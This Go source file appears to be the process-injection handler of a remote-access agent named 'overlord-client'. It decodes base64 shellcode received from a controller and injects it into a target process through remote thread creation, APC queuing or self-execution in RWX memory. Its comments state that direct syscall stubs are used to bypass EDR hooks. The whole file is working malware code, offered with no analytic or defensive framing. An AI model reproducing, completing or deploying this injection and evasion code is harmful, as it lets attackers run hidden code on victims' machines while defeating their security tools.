//go:build windows
// +build windows

package handlers

// HandleInject injects base64-encoded shellcode into a target process.
//
// Payload fields:
//   pid      int     — target process PID (0 = self-inject via NtCreateThread)
//   data     string  — base64-encoded shellcode
//   method   string  — "createthread" (default) | "apc" | "self"

import (
	"context"
	"encoding/base64"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"overlord-client/cmd/agent/evasion"
	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payload map[string]interface{}) error {
	b64, _ := payload["data"].(string)
	if b64 == "" {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false, Message: "missing data",
		})
	}
	sc, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false,
			Message: fmt.Sprintf("base64 decode: %v", err),
		})
	}

	pidFloat, _ := payload["pid"].(float64)
	pid := uint32(pidFloat)
	method, _ := payload["method"].(string)
	if method == "" {
		method = "createthread"
	}

	var injectErr error
	switch method {
	case "self":
		injectErr = injectSelf(sc)
	case "apc":
		injectErr = injectAPC(sc, pid)
	default:
		injectErr = injectCreateThread(sc, pid)
	}

	if injectErr != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false,
			Message: fmt.Sprintf("inject(%s) pid=%d: %v", method, pid, injectErr),
		})
	}
	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type: "command_result", CommandID: cmdID, OK: true,
		Message: fmt.Sprintf("injected %d bytes via %s into pid %d", len(sc), method, pid),
	})
}

// injectCreateThread allocates RWX memory in the target process and starts a
// thread at the shellcode address. Both allocation and thread creation are
// routed through direct NtAllocateVirtualMemory / NtCreateThreadEx syscall
// stubs (bypasses EDR hooks on the kernel32/ntdll Win32 dispatch path).
func injectCreateThread(sc []byte, pid uint32) error {
	proc, err := openTargetProcess(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(proc)

	addr := evasion.NtAllocateVirtualMemory(uintptr(proc), uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed")
	}

	evasion.NtWriteRemote(uintptr(proc), addr, sc)

	th := evasion.NtCreateThreadEx(uintptr(proc), addr)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx failed")
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// injectAPC queues a user-mode APC to all alertable threads of the target
// process. At least one thread must be in an alertable wait state for the APC
// to fire.
func injectAPC(sc []byte, pid uint32) error {
	proc, err := openTargetProcess(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(proc)

	k32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAllocEx := k32.NewProc("VirtualAllocEx")
	writeProcessMemory := k32.NewProc("WriteProcessMemory")
	queueUserAPC := k32.NewProc("QueueUserAPC")

	const memCommitReserve = 0x3000
	const pageExecReadWrite = 0x40

	addr, _, _ := virtualAllocEx.Call(
		uintptr(proc), 0, uintptr(len(sc)),
		memCommitReserve, pageExecReadWrite,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}
	writeProcessMemory.Call(uintptr(proc), addr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)

	// Enumerate threads of the target process and queue APC to each.
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	queued := 0
	if windows.Thread32First(snap, &te) == nil {
		for {
			if te.OwnerProcessID == pid {
				th, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, te.ThreadID)
				if err == nil {
					queueUserAPC.Call(addr, uintptr(th), 0)
					windows.CloseHandle(th)
					queued++
				}
			}
			if windows.Thread32Next(snap, &te) != nil {
				break
			}
		}
	}
	if queued == 0 {
		return fmt.Errorf("no threads accessible in pid %d", pid)
	}
	return nil
}

// injectSelf allocates RWX memory in the current process and executes the
// shellcode on a new thread. Used for testing / local execution.
func injectSelf(sc []byte) error {
	const selfProc = ^uintptr(0) // (HANDLE)-1
	mem := evasion.NtAllocateVirtualMemory(selfProc, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed")
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(sc))
	copy(dst, sc)

	th := evasion.NtCreateThreadEx(selfProc, mem)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx (self) failed")
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// openTargetProcess opens the process with necessary rights.
// If pid == 0, opens the current process.
func openTargetProcess(pid uint32) (windows.Handle, error) {
	if pid == 0 {
		return windows.GetCurrentProcess()
	}
	return windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|windows.PROCESS_QUERY_INFORMATION,
		false, pid,
	)
}
